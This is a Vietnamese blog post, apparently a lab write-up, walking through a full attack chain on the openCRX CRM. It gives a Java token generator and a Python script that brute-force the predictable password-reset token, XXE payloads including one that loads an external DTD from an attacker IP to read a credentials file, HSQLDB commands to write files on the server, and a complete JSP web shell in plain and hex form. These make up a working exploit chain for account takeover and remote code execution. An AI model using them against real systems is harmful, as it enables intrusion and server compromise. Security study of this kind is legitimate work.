![](https://images.viblo.asia/3b6e52c0-aca9-456f-88a7-d2e04f960a3c.jpeg)

Trong quá trình tìm hiểu và nghiên cứu vô tình mình thấy ứng dụng openCRX có lỗ hổng. Vì vậy, mình quyết định tìm hiểu và viết bài chia sẻ. Khi tìm hiểu cái mới điều đầu tiên mình làm là lên trang chủ đọc mô tả về nó.

> openCRX is an open CRM solution that meets the needs of organizations requiring multifunctional, enterprise-wide coordination of sales generation, sales fulfillment, marketing and service activities to customers, partners, suppliers or intermediaries.

Sau khi đọc phần mô tả trên ta rút ra được 2 điều:

1. Đây là phần mềm open source, do đó ta có thể tải source code về để audit.
2. Đây là ứng dụng quản lý khách hàng.

Sau khi đã có được các thông tin cơ bản về ứng dụng, tôi tiếp tục tìm xem phần mềm được code bằng gì. Thông tin này cũng có luôn trên trang chủ, openCRX code bằng Java và sử dụng database HSQLDB.

Ảnh trang chủ openCRX

![](https://images.viblo.asia/aec5b5c5-144c-44a0-9733-eb74b6c466b5.png)

Vậy là có thông tin cơ bản về ứng dụng, điều cần làm tiếp theo là kiểm tra xem ứng dụng trông như nào và hoạt động ra sao?

![](https://images.viblo.asia/24cf4e16-caf1-4483-aca1-dc455320024d.png)

Khi cài đặt theo mặc định openCRX sẽ có vài tài khoản như:

+ guest / guest
+ admin-Standard / admin-Standard
+ admin-Root / admin-Root

Ta sẽ dùng một tài khoản bất kỳ (mình dùng tài khoản admin-Root) để đăng nhập xem bên trong ra sao.

![](https://images.viblo.asia/89fefb9f-a0f3-46a4-910f-a943bc743e08.png)

Đến đây ta đã có cái nhìn tổng quan cả bên ngoài lẫn bên trong của ứng dụng. Tiếp đến ta sẽ tiếp hành tìm lỗi của openCRX. 


# Bypass authentication
Bước đầu tiên cần làm là bypass authentication, để bypass authentication thường ta sẽ chú ý vào chức năng liên quan đến tài khoản người dùng như: quên mật khẩu, đăng ký người dùng mới. Hay tìm lỗi SQL injection để từ đó có thể bypass authentication. Khi truy cập vào trang chủ của ứng dụng ta được chuyển hướng tới trang đăng nhập mà trên trang này không có link đăng ký. Do đó, mình kiểm tra lỗi SQL injection ở tính năng đăng nhập nhưng không thành công. Nhưng có một đáng chú ý là khi điền sai thông tin đăng nhập trang sẽ hiển thị ra link quên mật khẩu.

![](https://images.viblo.asia/1f5b3e0f-a524-46e1-ad27-1a19ddb31909.png)

Sau khi click vào link quên mật khẩu ô nhập username sẽ hiện ra. Nếu ta điền đúng tài khoản thông báo thành công hiện ra, điền sai thì ngược lại.

![](https://images.viblo.asia/39d8c687-1595-4a5a-b8a1-6850c5d0faa6.png)

Đến đây ta chú ý đến đường link đang truy cập đến là http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp và kiểm phần code html xem form sẽ gửi request về đâu.

![](https://images.viblo.asia/59a1a5e3-59e2-4c78-8d88-976b242b0293.png)

Vậy là ta đã biết được, phần code xử lý quên mật khẩu nằm ở file **RequestPasswordReset.jsp**. Phần việc tiếp theo cần làm là mở file đó lên là tìm xem có lỗi gì không để còn tìm hướng khác.

## Ý nghĩ phần mở rộng của Java
Ứng dụng được code và đóng gói theo chuẩn của Java. Vì vậy ta cần tìm hiểu phần mở rộng để biết với mỗi đuôi mở rộng thì ý nghĩ của chúng là gì.

+ **Java Archive (JAR)**: Được sử dụng cho một ứng dụng hoặc một thư viện. File gồm nhiều file class, image, doc, ... [wiki](https://en.wikipedia.org/wiki/JAR_(file_format))
+ **Web Application Archive (WAR)**: Gồm nhiều file **jar** [wiki](https://en.wikipedia.org/wiki/WAR_(file_format))
+ **Enterprise Application Archive (EAR)**: Gồm nhiều file **jar** hoặc **war** [wiki](https://en.wikipedia.org/wiki/EAR_(file_format))

Source code của ứng dụng nằm trong file `opencrx-core-CRX.ear` tại đường dẫn `crx/apache-tomee-plus-7.0.5/apps`. Ta cho file này vào phần mềm JD-GUI (Java Decompiler) để đọc code. Với ứng dụng code bằng java sẽ có file meta-data đánh chỉ mục các thành phần của ứng dụng. Do đó ta sẽ mở file **application.xml** trong **META-INF**. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<application id="opencrx-core-CRX-App" xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" version="5" xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/application_5.xsd">
	<display-name>openCRX EAR</display-name>
	<module id="opencrx-core-CRX">
		<web>
			<web-uri>opencrx-core-CRX.war</web-uri>
			<context-root>opencrx-core-CRX</context-root>
		</web>
	</module>
    ...
```

Theo chỉ dẫn của file **application.xml** ta biết được code của module nằm trong file **opencrx-core-CRX.war**. Mở file **opencrx-core-CRX.war** ta thấy ngay file **RequestPasswordReset.jsp**.

![](https://images.viblo.asia/e367b592-0a31-44fc-8473-f3012f48659a.png)

Mở file này đọc hiểu follow thì có một đoạn code ta cần chú ý.

```java
Boolean success = null;
String id = request.getParameter("id");

...

if(principalName != null && providerName != null && segmentName != null) {
			javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
			javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(
				SecurityKeys.ADMIN_PRINCIPAL + SecurityKeys.ID_SEPARATOR + segmentName, 
				null
			);
			try {
				org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
					new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", principalName)
				);
				pm.currentTransaction().begin();
				userHome.requestPasswordReset();
				pm.currentTransaction().commit();
				success = true;
			} catch(Exception e) {
				try {
					pm.currentTransaction().rollback();
				} catch(Exception ignore) {}
				success = false;
			}
		} else {
			success = false;
		}
	}
```

Kết hợp với request ta bắt được bằng burp ta biết được khi gửi username tồn tại trên hệ thống thì server trả về thành công.

![](https://images.viblo.asia/725de051-1596-4d2d-9d79-d3c4af7e3a5c.png)

Đi sâu vào tìm phần tích phần code trên, ta thấy có dòng code

```java
userHome.requestPasswordReset();
```

ta sẽ vào tìm hiểu xem code code này xử lý cái gì. Để tìm được ta sử dụng tính năng tìm kiếm của JD-GUI.

![](https://images.viblo.asia/10c16de2-afdb-4daf-a8cf-c66162d3870b.png)

Ta đã tìm được hàm này ở file **UserHome.class** và đoạn code của hàm đó như sau

```java
  public void requestPasswordReset(UserHome userHome) throws ServiceException {
    PersistenceManager pm = JDOHelper.getPersistenceManager(userHome);
    String providerName = userHome.refGetPath().getSegment(2).toClassicRepresentation();
    String segmentName = userHome.refGetPath().getSegment(4).toClassicRepresentation();
    String principalName = userHome.refGetPath().getLastSegment().toClassicRepresentation();
    Principal loginPrincipal = (Principal)SecureObject.getInstance().findPrincipal(principalName, 
        
        SecureObject.getInstance().getLoginRealmIdentity(userHome
          .refGetPath().getSegment(2).toClassicRepresentation()), pm);
    String webAccessUrl = userHome.getWebAccessUrl();
    if (webAccessUrl != null) {
      String resetToken = Utils.getRandomBase62(40);
      String name = providerName + "/" + segmentName + " Password Reset";
      String resetConfirmUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetConfirm.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
      String resetCancelUrl = webAccessUrl + (webAccessUrl.endsWith("/") ? "" : "/") + "PasswordResetCancel.jsp?t=" + resetToken + "&p=" + providerName + "&s=" + segmentName + "&id=" + principalName;
      String description = getRequestPasswordResetNotificationTemplate(userHome);
      description = description.replace("{RESET_CONFIRM_URL}", resetConfirmUrl);
      description = description.replace("{RESET_CANCEL_URL}", resetCancelUrl);
      Base.getInstance().sendAlert((ContextCapable)userHome, principalName, name, description, (short)2, 
          
          Integer.valueOf(0), null);
      SysLog.warning("Password reset request", Arrays.asList(new String[] { resetConfirmUrl, resetCancelUrl }));
      changePassword((Password)loginPrincipal
          .getCredential(), (String)null, "{RESET}" + resetToken);
    } 
  }
```

Trong đoạn code ta thấy biến **resetConfirmUrl** là link **reset password**. Mà link này có chứa **resetToken**, **resetToken** tạo ra từ hàm **Utils.getRandomBase62(40)** với code như hình dưới.

```java
  public static String getRandomBase62(int length) {
    String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    Random random = new Random(System.currentTimeMillis());
    String s = "";
    for (int i = 0; i < length; i++)
      s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62)); 
    return s;
  }
```

Hàm **getRandomBase62** sử dụng thư viện **import java.util.Random;** để tạo ra số ngẫu nhiên. Sau đó sử dụng số ngẫu nhiên này để tạo ra **token**. Nhưng hàm **Random** được biết là không tạo ra số ngẫu nhiên toàn toàn. Dưới là mô tả hàm từ trang chủ

> If two instances of Random are created with the same seed, and the same sequence of method calls is made for each, they will generate and return identical sequences of numbers. In order to guarantee this property, particular algorithms are specified for the class Random. Java implementations must use all the algorithms shown here for the class Random, for the sake of absolute portability of Java code. However, subclasses of class Random are permitted to use other algorithms, so long as they adhere to the general contracts for all the methods.

Hiểu đơn giản là có 2 thực thể (instance của lớp Random) được tạo cùng **seed** thì số ngẫu ngẫu nhiên tạo ra là giống nhau. Do đó ta hoàn toàn có thể đoán được **token** tạo ra. Từ đó ta có thể đoán được link sử dụng để lấy lại mật khẩu. Với đoạn code trên, **seed** khởi tạo cho Random là **System.currentTimeMillis()**. Để đoán được token ta sẽ ghi lại thời gian bắt đầu và kết thúc quá trình xử lý quên mật khẩu. Sau ta sẽ brute force với danh sách token đã tạo được dựa trên khoảng thời gian đã có.

Lấy mốc thời gian

```bash
date +%s%3N && curl -is -X POST http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp --data id=admin-Standard && date +%s%3N
```

Tạo danh sách token

```java
import java.util.Random;

public class GenRandomToken {
        public static void main(String args[]) {
                int length = 40;
                long start = Long.parseLong("time-start");
                long end = Long.parseLong("time-end");
                String token = "";

                for (long l=start; l<end; l++) {
                        token = getRandomBase62(length, l);
                        System.out.println(token);
                }
        }

        public static String getRandomBase62(int length, long seed) {
                String alphabet = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
                Random random = new Random(seed);
                String s = "";
                for (int i = 0; i < length; i++)
                        s = s + "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(random.nextInt(62)); 
                return s;
        }
}
```

## Xác nhận mật khẩu
Sau khi đã có được **token** để reset mật khẩu. Tiếp đến ta sẽ tìm nơi có thể thực hiện thao tác xác nhận reset mật khẩu. Nơi xử lý reset mật khẩu là file **PasswordResetConfirm.jsp**

```java
	Boolean success = null;
	String resetToken = request.getParameter("t");
	String providerName = request.getParameter("p");
	String segmentName = request.getParameter("s");
	String id = request.getParameter("id");
	String password1 = request.getParameter("password1");
	String password2 = request.getParameter("password2");
	if(
		resetToken != null && !resetToken.isEmpty() &&
		providerName != null && !providerName.isEmpty() &&
		segmentName != null && !segmentName.isEmpty() &&
		id != null && !id.isEmpty() &&
		password1 != null && !password1.isEmpty() &&
		password2 != null && !password2.isEmpty()
	) {
		javax.jdo.PersistenceManagerFactory pmf = org.opencrx.kernel.utils.Utils.getPersistenceManagerFactory();
		javax.jdo.PersistenceManager pm = pmf.getPersistenceManager(id, null);
		try {
			org.opencrx.kernel.home1.jmi1.UserHome userHome = (org.opencrx.kernel.home1.jmi1.UserHome)pm.getObjectById(
				new Path("xri://@openmdx*org.opencrx.kernel.home1").getDescendant("provider", providerName, "segment", segmentName, "userHome", id)
			);
			pm.currentTransaction().begin();
			org.opencrx.kernel.home1.jmi1.ChangePasswordParams params = Structures.create(
				org.opencrx.kernel.home1.jmi1.ChangePasswordParams.class, 
	           	Datatypes.member(org.opencrx.kernel.home1.jmi1.ChangePasswordParams.Member.oldPassword, org.opencrx.kernel.backend.UserHomes.RESET_PASSWORD_PREFIX + resetToken),
	           	Datatypes.member(org.opencrx.kernel.home1.jmi1.ChangePasswordParams.Member.newPassword, password1),
	           	Datatypes.member(org.opencrx.kernel.home1.jmi1.ChangePasswordParams.Member.newPasswordVerification, password2)           	
	        );
			org.opencrx.kernel.home1.jmi1.ChangePasswordResult result = userHome.changePassword(params);
			pm.currentTransaction().commit();
			success = result.getStatus() == 0;
		} catch(Exception e) {
			try {
				pm.currentTransaction().rollback();
			} catch(Exception ignore) {}
			success = false;
		}
	}
```

Để reset password ta cần truyền các tham số: resetToken, providerName, segmentName, password1, password2. Trong các tham số này, chỉ có **providerName** và **segmentName** là ta chưa biết. Khi xem log server chạy ta phát hiện link như sau

`http://localhost:8080/opencrx-corel.jsp?t=JLRj4kO2PbHQb89JYwDdPgJYdXQFXjH0YOMHQTBM&p=CRX&s=Standard&id=admin-Standard`
 
 Phần ta chú ý là `p=CRX&s=Standard` đây chính là 2 giá trị ta cần tìm. Tiếp đó ta sẽ viết một đoạn python để thực hiện việc brute force token để xác nhận mật khẩu.
 
 ```python
 #!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u','--user', help='Username to target', required=True)
parser.add_argument('-p','--password', help='Password value to set', required=True)
args = parser.parse_args()

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

print("Starting token spray. Standby.")
with open("admin-Standard-tokens.txt", "r") as f:
    for word in f:
        # t=resetToken&p=CRX&s=Standard&id=guest&password1=password&password2=password
        payload = {'t':word.rstrip(), 'p':'CRX','s':'Standard','id':args.user,'password1':args.password,'password2':args.password}

        r = requests.post(url=target, data=payload)
        res = r.text

        if "Unable to reset password" not in res:
            print("Successful reset with token: %s" % word)
            break
 ```
 
 ![](https://images.viblo.asia/35d15e39-dc25-408c-be64-9967e3b49c0d.png)

Vậy là đã thành công trong việc đổi lại mật khẩu. Giờ ta sẽ đăng nhập với mật khẩu vừa đổi.

![](https://images.viblo.asia/6e228ff1-dbb5-478b-9472-489c234f661a.png)

Vậy là bypass authentication thành công. Làm đến đây toát mồ hôi hột!

# Chiếm quyền điều khiển server
Khi đã vào được trang quản trị ta sẽ tìm cách RCE server của nạn nhân. Trong bài lab sử dụng openCRX version 4.2.0 tồn tại lỗ hổng XXE. Ta sử dụng lỗ hổng để lấy thông tin nhạy cảm từ đó chiếm quyền điều khiển server. Lỗ hổng XXE nằm tính năng test API của openCRX. Ta sẽ test thử một API với định dạng dữ liệu XML.

![](https://images.viblo.asia/4053b21f-8d17-4653-b3cb-65cd5c63f92d.png)

Đầu tiên ta gửi thử payload đơn giản để xác nhận lại lỗi.

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <org.opencrx.kernel.account1.Contact>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </org.opencrx.kernel.account1.Contact>
```

Kết quả trả về đã chứng minh hệ thống có lỗi XXE do giá trị **lastName** là **Doe**

![](https://images.viblo.asia/0edff383-d82c-40e3-b62b-781195896bc9.png)

Vậy là giờ ta có thể tận dụng lỗi này để chiếm quyền điều khiển server. Với ứng dụng sử dụng Apache Tomcat thì ta sẽ đọc file **tomcat-users.xml** để lấy thông tin đăng nhập vào trang quản lý từ đó có thể up shell lên. Nhưng điều đó đã không xảy ra, do ứng dụng này đã chặn không cho ta vào trang quản lý.

![](https://images.viblo.asia/f126cef6-432f-4183-9b56-73f17648f301.png)

Không dùng được cách này thì ta sẽ tìm các khác. OpenCRX sử dụng HSQLDB nên ta sẽ sử dụng nó để RCE. Để khai thác được lỗi này trước tiên cần phải đọc thông tin đăng nhập HSQLDB.

```xml
<?xml version="1.0" ?>
	<!DOCTYPE data [
		<!ENTITY % start "<![CDATA[">
		<!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh">
		<!ENTITY % end "]]>">
		<!ENTITY % dtd SYSTEM "http://192.168.119.154/wrapper.dtd">
		%dtd;
	]>
<org.opencrx.kernel.account1.Contact><lastName>&wrapper;</lastName><firstName>Tom</firstName></org.opencrx.kernel.account1.Contact>
```

![](https://images.viblo.asia/32f1b554-f335-4d51-baa3-718d7a0d861c.png)

Có thông tin đăng nhập ta sử dụng nó để đăng nhập vào database sử dụng HSQL client.

```bash
java -cp hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99
```

![](https://images.viblo.asia/1a4e0d6d-4187-401f-abae-f214087950f1.png)

Trong HSQLDB có thể gọi hàm tĩnh trong Java sử dụng Java  Language  Routines (JRT). Tạo thủ tục trong HSQLDB để ghi shell lên server.

```sql
CREATE PROCEDURE writeBytesToFilename(IN paramString VARCHAR, IN paramArrayOfByte VARBINARY(1024)) 
LANGUAGE JAVA 
DETERMINISTIC NO SQL 
EXTERNAL NAME 'CLASSPATH:com.sun.org.apache.xml.internal.security.utils.JavaUtils.writeBytesToFilename'
```

Sử dụng webshell jsp trên mạng có sẵn

```java
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```

Chuyển đoạn code trên thành dạng hex để tiện ghi vào database
```
3c2540207061676520696d706f72743d226a6176612e7574696c2e2a2c6a6176612e696f2e2a22253e0a3c48544d4c3e3c424f44593e0a3c464f524d204d4554484f443d2247455422204e414d453d226d79666f726d2220414354494f4e3d22223e0a3c494e50555420545950453d227465787422204e414d453d22636d64223e0a3c494e50555420545950453d227375626d6974222056414c55453d2253656e64223e0a3c2f464f524d3e0a3c7072653e0a3c250a69662028726571756573742e676574506172616d657465722822636d64222920213d206e756c6c29207b0a20202020202020206f75742e7072696e746c6e2822436f6d6d616e643a2022202b20726571756573742e676574506172616d657465722822636d642229202b20223c42523e22293b0a202020202020202050726f636573732070203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229293b0a20202020202020204f757470757453747265616d206f73203d20702e6765744f757470757453747265616d28293b0a2020202020202020496e70757453747265616d20696e203d20702e676574496e70757453747265616d28293b0a202020202020202044617461496e70757453747265616d20646973203d206e65772044617461496e70757453747265616d28696e293b0a2020202020202020537472696e672064697372203d206469732e726561644c696e6528293b0a20202020202020207768696c652028206469737220213d206e756c6c2029207b0a202020202020202020202020202020206f75742e7072696e746c6e2864697372293b200a2020202020202020202020202020202064697372203d206469732e726561644c696e6528293b200a202020202020202020202020202020207d0a20202020202020207d0a253e0a3c2f7072653e0a3c2f424f44593e3c2f48544d4c3e0a
```

Thực hiện câu lệnh ghi vào database
```sql
call writeBytesToFilename('../../apache-tomee-plus-7.0.5/apps/opencrx-core-CRX/opencrx-core-CRX/shell.jsp', cast('file-shell-hex' as VARBINARY(1024))
```

Khi đã có shell ta có thể thực thi tùy ý các câu lệnh trên server nạn nhân rồi.

![](https://images.viblo.asia/f0100125-c476-4cd5-9cca-f45fa8bf0e51.png)

Để tăng mức độ nghiêm trọng ta cần phải leo thang đặc quyền chiếm root server. Trong bài viết không nêu về cách leo thang đặc quyền vì nó là một chủ đề riêng.

Vậy là cũng kết thúc bài, cảm ơn các bạn đọc.